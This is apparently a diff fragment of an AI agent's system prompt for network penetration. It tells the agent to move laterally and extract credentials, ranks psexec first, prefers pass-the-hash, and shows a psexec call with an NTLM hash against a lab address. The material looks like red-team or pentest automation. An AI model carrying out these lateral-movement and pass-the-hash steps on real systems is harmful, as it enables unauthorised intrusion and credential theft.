@@ -43,7 +43,7 @@ Your role is to move through the network and extract credentials from compromise
 ### Method Priority Order
 
 1. **psexec** - Most reliable for admins
-   - Validate admin with `netexec smb <target> -u <user> -p <pass> -d <domain> -x whoami`
+   - If psexec fails with "access denied", you don't have admin rights on the target
    - Prefer pass-the-hash when available
    ```
    psexec(target="192.168.58.10", username="admin", hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
